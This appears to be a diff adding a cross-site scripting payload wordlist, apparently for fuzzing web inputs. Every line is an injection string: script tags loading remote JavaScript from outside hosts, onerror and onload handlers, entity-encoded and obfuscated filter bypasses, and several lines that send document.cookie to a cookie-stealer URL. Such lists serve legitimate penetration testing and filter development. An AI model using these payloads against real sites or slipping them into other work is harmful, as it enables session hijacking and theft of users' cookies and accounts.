@@ -1,0 +1,3334 @@
+"
+" type=image src=null onerror=X " \' type=image src=null onerror=X \'
+""+{toString:alert}
+""+{valueOf:alert}
+"&gt;&lt;script src=//brutelogic.com.br&sol;1.js&num;
+"&gt;&lt;script src=https://hackeroneofjaaah.xss.ht&gt;&lt;/script&gt;
+"'&gt;confirm&lpar;1)&lt;/Script&gt;&lt;Svg&gt;&lt;Script/1='
+"'>confirm&lpar;1)</Script><Svg><Script/1='
+")
+");
+")>
+"+document.cookie+"
+"+onmouseover="window.location='http://localhost'
+"/>
+"/><a href="invalid:2" id=x name=y>test</a>
+"/><a href=javascript&colon;confirm&lpar;document&period;cookie&rpar;>Click Here</a>
+"; alert&#40 3&#41 ; "
+";a.b=c;//
+";a[b]=c;//
+";escape=eval;//
+";location.href='http://site';//
+";location=name;//
+"<A HREF=""//blog.zsec.uk/"">XSS</A>"
+"<A HREF=""//google"">XSS</A>"
+"<A HREF=""//www.google.com/"">XSS</A>"
+"<A HREF=""h\ntt\tp://6"
+"<A HREF=""http://66.102.7.147/"">XSS</A>"
+"<A HREF=""http://blog.zsec.uk./"">XSS</A>"
+"<A HREF=""http://blog.zsec.uk/"">XSS</A>"
+"<A HREF=""http://google.com/"">XSS</A>"
+"<A HREF=""http://www.google.com./"">XSS</A>"
+"<A HREF=""javascript:document.location='http://blog.zsec.uk/'"">XSS</A>"
+"<A HREF=""javascript:document.location='http://www.google.com/'"">XSS</A>"
+"<EMBED SRC=""http://ha.ckers.org/xss.swf"" AllowScriptAccess=""always""></EMBED>"
+"<IMG SRC=""jav"
+"<LAYER SRC=""http://ha.ckers.org/scriptlet.html""></LAYER>"
+"<LINK REL=""stylesheet"" HREF=""http://ha.ckers.org/xss.css"">"
+"<META HTTP-EQUIV=""Link"" Content=""<http://ha.ckers.org/xss.css>; REL=stylesheet"">"
+"<OBJECT TYPE=""text/x-scriptlet"" DATA=""http://ha.ckers.org/scriptlet.html""></OBJECT>"
+"<SCRIPT ""a='>'"" SRC=""http://ha.ckers.org/xss.js""></SCRIPT>"
+"<SCRIPT ""a='>'"" SRC=""https://zero.xss.ht""></SCRIPT>"
+"<SCRIPT ="">"" SRC=""http://ha.ckers.org/xss.js""></SCRIPT>"
+"<SCRIPT ="">"" SRC=""https://zero.xss.ht""></SCRIPT>"
+"<SCRIPT SRC=""http://ha.ckers.org/xss.jpg""></SCRIPT>"
+"<SCRIPT a="">"" '' SRC=""http://ha.ckers.org/xss.js""></SCRIPT>"
+"<SCRIPT a="">"" '' SRC=""https://zero.xss.ht""></SCRIPT>"
+"<SCRIPT a="">"" SRC=""http://ha.ckers.org/xss.js""></SCRIPT>"
+"<SCRIPT a="">"" SRC=""https://zero.xss.ht""></SCRIPT>"
+"<SCRIPT a="">'>"" SRC=""http://ha.ckers.org/xss.js""></SCRIPT>"
+"<SCRIPT a="">'>"" SRC=""https://zero.xss.ht""></SCRIPT>"
+"<SCRIPT a=`>` SRC=""http://ha.ckers.org/xss.js""></SCRIPT>"
+"<SCRIPT a=`>` SRC=""https://zero.xss.ht""></SCRIPT>"
+"<SCRIPT/SRC=""http://ha.ckers.org/xss.js""></SCRIPT>"
+"<SCRIPT/SRC=""https://zero.xss.ht""></SCRIPT>"
+"<SCRIPT/XSS SRC=""http://ha.ckers.org/xss.js""></SCRIPT>"
+"<SCRIPT/XSS SRC=""https://zero.xss.ht""></SCRIPT>"
+"<XML SRC=""xsstest.xml"" ID=I></XML><SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></SPAN>"
+"<div datafld=""b"" dataformatas=""html"" datasrc=""#X""></div>"
+"<xml SRC=""xsstest.xml"" ID=I></xml><SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></SPAN>"
+">
+"></video>
+"><?xml:namespace prefix="t" ns="urn:schemas-microsoft-com:time">
+"><A CLASS=X></A>
+"><A HREF="//google">X</A>
+"><IMG ONERROR=�VBS:MSGBOX 1� SRC=A>
+"><IMG ONERROR=”VBS:MSGBOX 1” SRC=A>
+"><SCRIPT LANGUAGE=VBS>MSGBOX 1</SCRIPT>
+"><SCRIPT>a=/X/
+"><SPAN DATASRC="#X" DATAFLD="B" DATAFORMATAS="HTML"></SPAN>
+"><a href=javascript&colon;confirm&lpar;document&period;cookie&rpar;>Click Here</a>
+"><a onmouseover="javascript:window.onerror=alert;throw 1>
+"><b/alt="1"onmouseover=InputBox+1language=vbs>X</b>
+"><body language=vbs onload=window.location='http://xss.cx'>
+"><body language=vbsonload=alert-1
+"><body onload="X">
+"><body/onload=javascript:window.onerror=eval;throw'=alert\x281\x29';
+"><br><br><b><u>X</u></b>
+"><div datafld="b" dataformatas="html" datasrc="#X"></div>
+"><div style="[a]color[b]:[c]red">XXX</div>
+"><div style="font-family:'foo[a];color:red;';">XXX</div>
+"><div style="font-family:foo}color=red;">X
+"><embed/src=//goo.gl/nlX0P>
+"><h1>X</h1>
+"><iframe src='https://testforiframe.site/'>
+"><iframe src=j&#x61;vasc&#x72ipt&#x3a;alert&#x28;1&#x29; >
+"><img language=�JScript.Encode� onerror=�#@~^CAAAAA==C^+.D`8#mgIAAA==^#~@� src=a>
+"><img language=”JScript.Encode” onerror=”#@~^CAAAAA==C^+.D`8#mgIAAA==^#~@” src=a>
+"><img onerror=MsgBox+1 language=vbs src=a>
+"><img onerror=�vbs:MsgBox 1� src=a>
+"><img onerror=”vbs:MsgBox 1” src=a>
+"><img src=x onerror="javascript:window.onerror=alert;throw 1">
+"><img/src="mars.png"alt="mars">
+"><input type="submit" formaction="javascript&colon;this&lsqb;'a'&plus;'lert'&rsqb;`1`"
+"><link rel="stylesheet" href="http://8ant.org/asdfqwer.css"><"
+"><marquee>Kerala Cyber Force</marquee>
+"><object type="text/x-scriptlet" data="http://jsfiddle.net/XLE63/ "></object>
+"><object/data=//goo.gl/nlX0P>
+"><script language=vbs>MsgBox 1</script>
+"><script src="file:///c:/wonderful.js"></script><"
+"><script src="https://testforiframe.site/"></script>
+"><script src=//brutelogic.com.br&sol;1.js&num;
+"><script src=https://hackeroneofjaaah.xss.ht></script>
+"><script src=https://zero.xss.ht></script>
+"><script x=#"async=#"src="//â’›â‚¨
+"><script x=#"async=#"src="//⒛₨
+"><script>"
+"><script>document.location='http://cookieStealer/cgi-bin/cookie.cgi?'+document.cookie</script>
+"><script>document.location='http://your.site.com/cgi-bin/cookie.cgi?'+document.cookie</script>
+"><script>document.location='http://your.site.com/cgi-bin/cookie.cgi?'???.cookie</script>
+"><style>*[{}@import'test.css?]{color: green;}</style>X
+"><svg/onload"
+"><svg><script>alert&#40 1&#41
+"><svg><script>alert&#40/1/&#41</script>
+"><svg><script>alert`1`
+"><svg><script>prompt&#40 1&#41</script>
+"autofocus x=
+"o<nblur=&apos;`
+"onBlur="&#x061;&#x06c;&#x065;&#x072;&#x074;&#x028;&#x027;&#x058;&#x053;&#x053;&#x027;&#x029;"
+"onMouseLeave="&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;"
+"onblur<='`
+"onwheel"
+"xss'cx</img
+${``[class extends[alert``]{}]}
+&#060;
+&#062;
+&#108;&#101;&&lt;WBR&gt;#114;&#116;&#40;&#39;&#88;&#83&lt;WBR&gt;;&#83;&#39;&#41&gt;
+&#108;&#101;&<WBR>#114;&#116;&#40;&#39;&#88;&#83<WBR>;&#83;&#39;&#41>
+&#37;BCscript&#37;BEalert&#40;&#37;A2XSS&#37;A2&#41;&#37;BC&#47;script&#37;BE
+&#38;&#108;&#116;&#59;script&#38;&#103;&#116;&#59;
+&#39;&#88;&#83;&#83;&#39;&#41;&gt;
+&#39;&#88;&#83;&#83;&#39;&#41;>
+&#46&#120&#109&#108&#92&#35&#120&#115&#115&#41&&gt;
+&#46&#120&#109&#108&#92&#35&#120&#115&#115&#41&>
+&#60
+&#60;
+&#60;&#47;TITLE&#62;&#60;SCRIPT&#62;alert&#40;&#34;XSS&#34;&#41;&#59;&#60;&#47;SCRIPT&#62;
+&#60;&#60;SCRIPT&#62;alert&#40;&#34;XSS&#34;&#41;&#59;&#47;&#47;&#60;&#60;&#47;SCRIPT&#62;
+&#60;BASE HREF&#61;&#34;javascript&#58;alert&#40;&#39;XSS&#39;&#41;&#59;&#47;&#47;&#34;&#62;
+&#60;BGSOUND SRC&#61;&#34;javascript&#58;alert&#40;&#39;XSS&#39;&#41;&#59;&#34;&#62;
+&#60;BODY BACKGROUND&#61;&#34;javascript&#58;alert&#40;&#39;XSS&#39;&#41;&#59;&#34;&#62;
+&#60;BODY ONLOAD&#61;alert&#40;&#39;XSS&#39;&#41;&#62;
+&#60;BR SIZE&#61;&#34;&#38;&#123;alert&#40;&#39;XSS&#39;&#41;&#125;&#34;&#62;
+&#60;DIV STYLE&#61;&#34;width&#58; expression&#40;alert&#40;&#39;XSS&#39;&#41;&#41;&#59;&#34;&#62;
+&#60;IFRAME SRC&#61;http&#58;&#47;&#47;testsite.com&#47;scriptlet.html &#60;
+&#60;IMG DYNSRC&#61;&#34;javascript&#58;alert&#40;&#39;XSS&#39;&#41;&#59;&#34;&#62;
+&#60;IMG LOWSRC&#61;&#34;javascript&#58;alert&#40;&#39;XSS&#39;&#41;&#59;&#34;&#62;
+&#60;IMG SRC&#61;&#34; &#38;&#35;14&#59; javascript&#58;alert&#40;&#39;XSS&#39;&#41;&#59;&#34;&#62;
+&#60;IMG SRC&#61;&#34;jav ascript&#58;alert&#40;&#39;XSS&#39;&#41;&#59;&#34;&#62;
+&#60;IMG SRC&#61;&#34;jav&#38;&#35;x09&#59;ascript&#58;alert&#40;&#39;XSS&#39;&#41;&#59;&#34;&#62;
+&#60;IMG SRC&#61;&#34;jav&#38;&#35;x0A&#59;ascript&#58;alert&#40;&#39;XSS&#39;&#41;&#59;&#34;&#62;
+&#60;IMG SRC&#61;&#34;jav&#38;&#35;x0D&#59;ascript&#58;alert&#40;&#39;XSS&#39;&#41;&#59;&#34;&#62;
+&#60;IMG SRC&#61;&#34;javascript&#58;alert&#40;&#39;XSS&#39;&#41;&#34;
+&#60;IMG SRC&#61;&#34;javascript&#58;alert&#40;&#39;XSS&#39;&#41;&#59;&#34;&#62;
+&#60;IMG SRC&#61;&#34;livescript&#58;&#91;code&#93;&#34;&#62;
+&#60;IMG SRC&#61;&#34;mocha&#58;&#91;code&#93;&#34;&#62;
+&#60;IMG SRC&#61;&#39;vbscript&#58;msgbox&#40;&#34;XSS&#34;&#41;&#39;&#62;
+&#60;IMG SRC&#61;JaVaScRiPt&#58;alert&#40;&#39;XSS&#39;&#41;&#62;
+&#60;IMG SRC&#61;javascript&#58;alert&#40;&#38;quot&#59;XSS&#38;quot&#59;&#41;&#62;
+&#60;IMG SRC&#61;javascript&#58;alert&#40;&#39;XSS&#39;&#41;&#62;
+&#60;SCRIPT SRC&#61;&#34;http&#58;&#47;&#47;testsite.com&#47;xss.jpg&#34;&#62;&#60;&#47;SCRIPT&#62;
+&#60;SCRIPT SRC&#61;&#47;&#47;testsite.com&#47;.j&#62;
+&#60;SCRIPT SRC&#61;http&#58;&#47;&#47;testsite.com&#47;xss.js
+&#60;SCRIPT SRC&#61;http&#58;&#47;&#47;testsite.com&#47;xss.js&#62;&#60;&#47;SCRIPT&#62;
+&#60;SCRIPT&#62;a&#61;&#47;XSS&#47; alert&#40;a.source&#41;&#60;&#47;SCRIPT&#62;
+&#60;SCRIPT&#62;alert&#40;&#39;XSS&#39;&#41;&#60;&#47;SCRIPT&#62;
+&#60;XSS STYLE&#61;&#34;xss&#58;expression&#40;alert&#40;&#39;XSS&#39;&#41;&#41;&#34;&#62;
+&#62
+&#62;
+&#92&#47&#120&#98&#108&#92&#47&#120&#98&#108&#92
+&#X003C
+&#X003C;
+&#X003E
+&#X003E;
+&#X003c
+&#X003c;
+&#X003e
+&#X003e;
+&#X03C
+&#X03C;
+&#X03E
+&#X03E;
+&#X03c
+&#X03c;
+&#X03e
+&#X03e;
+&#X3C
+&#X3C;
+&#X3E
+&#X3E;
+&#X3c
+&#X3c;
+&#X3e
+&#X3e;
+&#x003C
+&#x003C;
+&#x003E
+&#x003E;
+&#x003c
+&#x003c;
+&#x003e
+&#x003e;
+&#x03C
+&#x03C;
+&#x03E
+&#x03E;
+&#x03c
+&#x03c;
+&#x03e
+&#x03e;
+&#x3C
+&#x3C;
+&#x3E
+&#x3E;
+&#x3c
+&#x3c;
+&#x3e
+&#x3e;
+&#x61;l&#x65;rt&#40;1)
+&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x0a;
+&&lt;WBR&gt;#x27&#x58&#x53&#x53&#x27&#x29&gt;
+&&lt;script&gt;document.vulnerable=true;&lt;/script&gt;
+&'">&lt;script&gt;alert&lpar;&sol;X&sol;&rpar;&lt;&sol;script&gt;
+&'">/'-C<FEP=#YA;&5R="@O>'-S+RD\+W-C<FEP=#.
+&'">Description:Syntax error Msg:Unexpected token < )
+&'">TypeError: Cannot read property '$content$' of undefined
+&<WBR>#x27&#x58&#x53&#x53&#x27&#x29>
+&<script>document.cookie=true;</script>
+&<script>document.vulnerable=true;</script>
+&ADz&AGn&AG0&AEf&ACA&AHM&AHI&AGO&AD0&AGn&ACA&AG8Abg&AGUAcgByAG8AcgA9AGEAbABlAHIAdAAoADEAKQ&ACAAPABi
+&GT
+&GT;
+&LT
+&LT;
+&Ntk=All&Ntx=mode+matchallpartial
+&amp;#39;&amp;#88;&amp;#83;&amp;#83;&amp;#39;&amp;#41;&gt;
+&clickTAG=http://www.youtube.com/watch
+&error=catalogue.asp
+&gt
+&gt;
+&gt;"'
+&gt;&lt;object+data=//14.rs&gt;
+&gt;&lt;script src=//pastebin.com/raw/WDWWYaLA&gt;&lt;/script&gt;
+&gt;test--&gt;
+&i=WmYmMm28
+&id=11
+&js=n&prev=_t&hl=en&ie=UTF-8&layout=2&eotf=1&sl=zh-CN&tl=en&u=http://www.govsb.org/blog/306.html
+&keywords="+type="image"+src='http://static.reddit.com/reddit.com.header.png'
+&kid=TTB2
+&l-id=gb_category_search
+&list=PLpr-xdpM8wG-ZTcHhFfAeBthNVZVEtkg9
+&lt
+&lt;
+&lt;&lt;SCRIPT&gt;document.vulnerable=true;//&lt;&lt;/SCRIPT&gt;
+&lt;&lt;scr\0ipt/src=http://xss.com/xss.js&gt;&lt;/script
+&lt;&lt;script&gt;document.vulnerable=true;&lt;/script&gt;
+&lt;/BODY&gt;&lt;/HTML&gt;
+&lt;/C&gt;&lt;/X&gt;&lt;/xml&gt;&lt;SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML&gt;&lt;/SPAN&gt;
+&lt;/TITLE&gt;&lt;object/data=https://finickycold.htmlpasta.com&gt;
+&lt;/a&gt;
+&lt;/a&gt;//["'`--&gt;]]&gt;]&lt;/div&gt;
+&lt;/b&gt;
+&lt;/body&gt;
+&lt;/div&gt;
+&lt;/doc&gt;//["'`--&gt;]]&gt;]&lt;/div&gt;
+&lt;/feImage&gt;
+&lt;/form&gt;
+&lt;/form&gt;//["'`--&gt;]]&gt;]&lt;/div&gt;
+&lt;/head&gt;
+&lt;/html&gt;
+&lt;/html&gt;//["'`--&gt;]]&gt;]&lt;/div&gt;
+&lt;/html:html&gt;
+&lt;/html:script&gt;
+&lt;/image&gt;
+&lt;/math&gt;//["'`--&gt;]]&gt;]&lt;/div&gt;
+&lt;/script&gt;
+&lt;/script&gt;     &lt;script&gt;[class extends[alert``]{}]&lt;/script&gt;
+&lt;/script&gt;//["'`--&gt;]]&gt;]&lt;/div&gt;
+&lt;/style&gt;
+&lt;/style&gt;//["'`--&gt;]]&gt;]&lt;/div&gt;
+&lt;/stylesheet&gt;//["'`--&gt;]]&gt;]&lt;/div&gt;
+&lt;/svg&gt;//["'`--&gt;]]&gt;]&lt;/div&gt;
+&lt;/svg:mask&gt;
+&lt;/svg:svg&gt;
+&lt;/template&gt;
+&lt;/title&gt;&lt;SCRIPT&gt;document.vulnerable=true;&lt;/script&gt;
+&lt;/xmp&gt;
+&lt;/xsl:stylesheet&gt;
+&lt;/xsl:template&gt;
+&lt;;A HREF=";//google";&gt;;XSS&lt;;/A&gt;;
+&lt;;A HREF=";//www.google.com/";&gt;;XSS&lt;;/A&gt;;
+&lt;;A HREF=";http://66.102.7.147/";&gt;;XSS&lt;;/A&gt;;
+&lt;;A HREF=";http://google.com/";&gt;;XSS&lt;;/A&gt;;
+&lt;;A HREF=";http://google:ha.ckers.org";&gt;;XSS&lt;;/A&gt;;
+&lt;;A HREF=";http://ha.ckers.org@google";&gt;;XSS&lt;;/A&gt;;
+&lt;;A HREF=";http://www.google.com./";&gt;;XSS&lt;;/A&gt;;
+&lt;;A HREF=";javascript:document.location=';http://www.google.com/';";&gt;;XSS&lt;;/A&gt;;
+&lt;;EMBED SRC=";http://ha.ckers.org/xss.swf"; AllowScriptAccess=";always";&gt;;&lt;;/EMBED&gt;;
+&lt;;HTML xmlns:xss&gt;;
+&lt;;HTML&gt;;&lt;;BODY&gt;;
+&lt;;IFRAME SRC=http://ha.ckers.org/scriptlet.html &lt;;
+&lt;;IMG SRC=";http://www.thesiteyouareon.com/somecommand.php?somevariables=maliciouscode";&gt;;
+&lt;;IMG SRC=";livescript:[code]";&gt;;
+&lt;;IMG SRC=";mocha:[code]";&gt;;
+&lt;;LAYER SRC=";http://ha.ckers.org/scriptlet.html";&gt;;&lt;;/LAYER&gt;;
+&lt;;LINK REL=";stylesheet"; HREF=";http://ha.ckers.org/xss.css";&gt;;
+&lt;;META HTTP-EQUIV=";Link"; Content=";&lt;;http://ha.ckers.org/xss.css&gt;;; REL=stylesheet";&gt;;
+&lt;;SCRIPT ";a=';&gt;;';"; SRC=";http://ha.ckers.org/xss.js";&gt;;&lt;;/SCRIPT&gt;;
+&lt;;SCRIPT =";blah"; SRC=";http://ha.ckers.org/xss.js";&gt;;&lt;;/SCRIPT&gt;;
+&lt;;SCRIPT SRC=";http://ha.ckers.org/xss.jpg";&gt;;&lt;;/SCRIPT&gt;;
+&lt;;SCRIPT SRC=//ha.ckers.org/.j&gt;;
+&lt;;SCRIPT SRC=http://ha.ckers.org/xss.js
+&lt;;SCRIPT SRC=http://ha.ckers.org/xss.js&gt;;&lt;;/SCRIPT&gt;;
+&lt;;SCRIPT a=";&gt;';&gt;"; SRC=";http://ha.ckers.org/xss.js";&gt;;&lt;;/SCRIPT&gt;;
+&lt;;SCRIPT a=";&gt;;"; SRC=";http://ha.ckers.org/xss.js";&gt;;&lt;;/SCRIPT&gt;;
+&lt;;SCRIPT a=";blah"; ';'; SRC=";http://ha.ckers.org/xss.js";&gt;;&lt;;/SCRIPT&gt;;
+&lt;;SCRIPT a=`&gt;;` SRC=";http://ha.ckers.org/xss.js";&gt;;&lt;;/SCRIPT&gt;;
+&lt;;SCRIPT&gt;;a=/XSS/
+&lt;;SCRIPT/XSS SRC=";http://ha.ckers.org/xss.js";&gt;;&lt;;/SCRIPT&gt;;
+&lt;;STYLE&gt;;@import';http://ha.ckers.org/xss.css';;&lt;;/STYLE&gt;;
+&lt;;XML SRC=";http://ha.ckers.org/xsstest.xml"; ID=I&gt;;&lt;;/XML&gt;;
+&lt;?import namespace="t" implementation="#default#time2"&gt;
+&lt;?import namespace=\"t\" implementation=\"#default#time2\"&gt;
+&lt;?xml version="1.0"?&gt;
+&lt;?xml&#58;namespace prefix=\"t\" ns=\"urn&#58;schemas-microsoft-com&#58;time\"&gt;
+&lt;?xml-stylesheet type="text/xml" href="#stylesheet"?&gt;
+&lt;?xml:namespace prefix="t" ns="urn:schemas-microsoft-com:time"&gt;
+&lt;A HREF="//google"&gt;XSS&lt;/A&gt;
+&lt;A HREF="//www.google.com/"&gt;XSS&lt;/A&gt;
+&lt;A HREF="http://66.102.7.147/"&gt;XSS&lt;/A&gt;
+&lt;A HREF="http://google.com/"&gt;XSS&lt;/A&gt;
+&lt;A HREF="http://google:ha.ckers.org"&gt;XSS&lt;/A&gt;
+&lt;A HREF="http://ha.ckers.org@google"&gt;XSS&lt;/A&gt;
+&lt;A HREF="http://www.google.com./"&gt;XSS&lt;/A&gt;
+&lt;A HREF="javascript:document.location='http://www.google.com/'"&gt;XSS&lt;/A&gt;
+&lt;A HREF=&quot;//google&quot;&gt;XSS&lt;/A&gt;
+&lt;A HREF=&quot;//www.google.com/&quot;&gt;XSS&lt;/A&gt;
+&lt;A HREF=&quot;http://66.102.7.147/&quot;&gt;XSS&lt;/A&gt;
+&lt;A HREF=&quot;http://google.com/&quot;&gt;XSS&lt;/A&gt;
+&lt;A HREF=&quot;http://google:ha.ckers.org&quot;&gt;XSS&lt;/A&gt;
+&lt;A HREF=&quot;http://ha.ckers.org@google&quot;&gt;XSS&lt;/A&gt;
+&lt;A HREF=&quot;http://www.google.com./&quot;&gt;XSS&lt;/A&gt;
+&lt;A HREF=\"//google\"&gt;XSS&lt;/A&gt;
+&lt;A HREF=\"//www&#46;google&#46;com/\"&gt;XSS&lt;/A&gt;
+&lt;A HREF=\"http&#58;//66&#46;102&#46;7&#46;147/\"&gt;XSS&lt;/A&gt;
+&lt;A HREF=\"http&#58;//google&#46;com/\"&gt;XSS&lt;/A&gt;
+&lt;A HREF=\"http&#58;//google&#58;ha&#46;ckers&#46;org\"&gt;XSS&lt;/A&gt;
+&lt;A HREF=\"http&#58;//ha&#46;ckers&#46;org@google\"&gt;XSS&lt;/A&gt;
+&lt;A HREF=\"http&#58;//www&#46;google&#46;com&#46;/\"&gt;XSS&lt;/A&gt;
+&lt;A href="
+&lt;D3"&lt;"/OncLick="1&gt;[confirm``]"&lt;"&gt;z
+&lt;D3/OnpOinTeReENter=confirm``&gt;click here
+&lt;EMBED SRC="http://ha.ckers.org/xss.swf" AllowScriptAccess="always"&gt;&lt;/EMBED&gt;
+&lt;EMBED SRC="http://hacker.com/xss.swf" AllowScriptAccess="always"&gt;
+&lt;FRAMESET&gt;&lt;FRAME SRC="javascript:document.vulnerable=true;"&gt;&lt;/frameset&gt;
+&lt;HTML xmlns:xss&gt;
+&lt;HTML&gt;&lt;BODY&gt;
+&lt;IFRAME SRC="javascript:document.vulnerable=true;"&gt;&lt;/iframe&gt;
+&lt;IFRAME SRC=http://ha.ckers.org/scriptlet.html &lt;
+&lt;IFRAME SRC=”http://hacker-site.com/xss.html”&gt;
+&lt;IMG SRC="http://www.thesiteyouareon.com/somecommand.php?somevariables=maliciouscode"&gt;
+&lt;IMG SRC="livescript:[code]"&gt;
+&lt;IMG SRC="mocha:[code]"&gt;
+&lt;IMG SRC=&quot;livescript:[code]&quot;&gt;
+&lt;IMG SRC=&quot;mocha:[code]&quot;&gt;
+&lt;IMG SRC=\"livescript&#058;&#91;code&#93;\"&gt;
+&lt;IMG SRC=\"mocha&#58;&#91;code&#93;\"&gt;
+&lt;IMGSRC=&#106;&#97;&#118;&#97;&&lt;WBR&gt;#115;&#99;&#114;&#105;&#112;&&lt;WBR&gt;#116;&#58;&#97;
+&lt;Img src = x onerror = "javascript: window.onerror = alert; throw XSS"&gt;
+&lt;Input value = "XSS" type = text&gt;
+&lt;LAYER SRC="http://ha.ckers.org/scriptlet.html"&gt;&lt;/LAYER&gt;
+&lt;LAYER SRC="javascript:document.vulnerable=true;"&gt;&lt;/LAYER&gt;
+&lt;LAYER SRC=&quot;http://ha.ckers.org/scriptlet.html&quot;&gt;&lt;/LAYER&gt;
+&lt;LAYER SRC=\"http&#58;//ha&#46;ckers&#46;org/scriptlet&#46;html\"&gt;&lt;/LAYER&gt;
+&lt;LINK REL="stylesheet" HREF="http://ha.ckers.org/xss.css"&gt;
+&lt;LINK REL=&quot;stylesheet&quot; HREF=&quot;http://ha.ckers.org/xss.css&quot;&gt;
+&lt;LINK REL=\"stylesheet\" HREF=\"http&#58;//ha&#46;ckers&#46;org/xss&#46;css\"&gt;
+&lt;META HTTP-EQUIV="Link" Content="&lt;http://ha.ckers.org/xss.css&gt;; REL=stylesheet"&gt;
+&lt;OBJECT TYPE="text/x-scriptlet" DATA="http://ha.ckers.org/scriptlet.html"&gt;&lt;/OBJECT&gt;
+&lt;OBJECT TYPE="text/x-scriptlet" DATA="http://hacker.com/xss.html"&gt;
+&lt;SCRIPT "a='&gt;'" SRC="http://ha.ckers.org/xss.js"&gt;&lt;/SCRIPT&gt;
+&lt;SCRIPT ="&gt;" SRC="http://ha.ckers.org/xss.js"&gt;&lt;/SCRIPT&gt;
+&lt;SCRIPT ="blah" SRC="http://ha.ckers.org/xss.js"&gt;&lt;/SCRIPT&gt;
+&lt;SCRIPT =&quot;blah&quot; SRC=&quot;http://ha.ckers.org/xss.js&quot;&gt;&lt;/SCRIPT&gt;
+&lt;SCRIPT =\"&gt;\" SRC=\"http&#58;//ha&#46;ckers&#46;org/xss&#46;js\"&gt;&lt;/SCRIPT&gt;
+&lt;SCRIPT SRC="http://ha.ckers.org/xss.jpg"&gt;&lt;/SCRIPT&gt;
+&lt;SCRIPT SRC=&quot;http://ha.ckers.org/xss.jpg&quot;&gt;&lt;/SCRIPT&gt;
+&lt;SCRIPT SRC=//BRUTELOGIC.COM.BR/1&gt;&lt;/SCRIPT&gt;
+&lt;SCRIPT SRC=//ha&#46;ckers&#46;org/&#46;js&gt;
+&lt;SCRIPT SRC=//ha.ckers.org/.j&gt;
+&lt;SCRIPT SRC=//xss.rocks/.j>
+&lt;SCRIPT SRC=\"http&#58;//ha&#46;ckers&#46;org/xss&#46;jpg\"&gt;&lt;/SCRIPT&gt;
+&lt;SCRIPT SRC=http&#58;//ha&#46;ckers&#46;org/xss&#46;js&gt;&lt;/SCRIPT&gt;
+&lt;SCRIPT SRC=http&#58;//ha&#46;ckers&#46;org/xss&#46;js?&lt;B&gt;
+&lt;SCRIPT SRC=http://ha.ckers.org/xss.js
+&lt;SCRIPT SRC=http://ha.ckers.org/xss.js&gt;&lt;/SCRIPT&gt;
+&lt;SCRIPT SRC=http://ha.ckers.org/xss.js?&lt; B &gt;
+&lt;SCRIPT SRC=http://ha.ckers.org/xss.js?&lt;B&gt;
+&lt;SCRIPT SRC=http://hacker-site.com/xss.js&gt;&lt;/SCRIPT&gt;
+&lt;SCRIPT \"a='&gt;'\" SRC=\"http&#58;//ha&#46;ckers&#46;org/xss&#46;js\"&gt;&lt;/SCRIPT&gt;
+&lt;SCRIPT a="&gt;" '' SRC="http://ha.ckers.org/xss.js"&gt;&lt;/SCRIPT&gt;
+&lt;SCRIPT a="&gt;" SRC="http://ha.ckers.org/xss.js"&gt;&lt;/SCRIPT&gt;
+&lt;SCRIPT a="&gt;'&gt;" SRC="http://ha.ckers.org/xss.js"&gt;&lt;/SCRIPT&gt;
+&lt;SCRIPT a="blah" '' SRC="http://ha.ckers.org/xss.js"&gt;&lt;/SCRIPT&gt;
+&lt;SCRIPT a=&quot;&gt;&quot; SRC=&quot;http://ha.ckers.org/xss.js&quot;&gt;&lt;/SCRIPT&gt;
+&lt;SCRIPT a=&quot;>&apos;>&quot; SRC=&quot;http://ha.ckers.org/xss.js&quot;&gt;&lt;/SCRIPT&gt;
+&lt;SCRIPT a=\"&gt;'&gt;\" SRC=\"http&#58;//ha&#46;ckers&#46;org/xss&#46;js\"&gt;&lt;/SCRIPT&gt;
+&lt;SCRIPT a=\"&gt;\" '' SRC=\"http&#58;//ha&#46;ckers&#46;org/xss&#46;js\"&gt;&lt;/SCRIPT&gt;
+&lt;SCRIPT a=\"&gt;\" SRC=\"http&#58;//ha&#46;ckers&#46;org/xss&#46;js\"&gt;&lt;/SCRIPT&gt;
+&lt;SCRIPT a=`&gt;` SRC="http://ha.ckers.org/xss.js"&gt;&lt;/SCRIPT&gt;
+&lt;SCRIPT a=`&gt;` SRC=&quot;http://ha.ckers.org/xss.js&quot;&gt;&lt;/SCRIPT&gt;
+&lt;SCRIPT a=`&gt;` SRC=\"http&#58;//ha&#46;ckers&#46;org/xss&#46;js\"&gt;&lt;/SCRIPT&gt;
+&lt;SCRIPT&gt;a=/X/
+&lt;SCRIPT&gt;a=/XSS/
+&lt;SCRIPT/SRC="http://ha.ckers.org/xss.js"&gt;&lt;/SCRIPT&gt;
+&lt;SCRIPT/SRC=\"http&#58;//ha&#46;ckers&#46;org/xss&#46;js\"&gt;&lt;/SCRIPT&gt;
+&lt;SCRIPT/XSS SRC="http://ha.ckers.org/xss.js"&gt;&lt;/SCRIPT&gt;
+&lt;SCRIPT/XSS SRC=&quot;http://ha.ckers.org/xss.js&quot;&gt;&lt;/SCRIPT&gt;
+&lt;SCRIPT/XSS SRC=\"http&#58;//ha&#46;ckers&#46;org/xss&#46;js\"&gt;&lt;/SCRIPT&gt;
+&lt;SPAN DATASRC="#X" DATAFLD="B" DATAFORMATAS="HTML"&gt;&lt;/SPAN&gt;
+&lt;SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML&gt;&lt;/SPAN&gt;
+&lt;SPAN DATASRC=\"#xss\" DATAFLD=\"B\" DATAFORMATAS=\"HTML\"&gt;&lt;/SPAN&gt;
+&lt;STYLE&gt;@import&apos;http://ha.ckers.org/xss.css&apos;;&lt;/STYLE&gt;
+&lt;STYLE&gt;@import'http&#58;//ha&#46;ckers&#46;org/xss&#46;css';&lt;/STYLE&gt;
+&lt;STYLE&gt;@import'http://ha.ckers.org/xss.css';&lt;/STYLE&gt;
+&lt;X OnXxx=1
+&lt;X onxxx=1
+&lt;XML SRC="http://ha.ckers.org/xsstest.xml" ID=I&gt;&lt;/XML&gt;
+&lt;XML SRC=&quot;http://ha.ckers.org/xsstest.xml&quot; ID=I&gt;&lt;/XML&gt;
+&lt;XML SRC=\"xsstest&#46;xml\" ID=I&gt;&lt;/XML&gt;
+&lt;a class=bar href="http://www.example.org"&gt;www.example.org&lt;/a&gt;
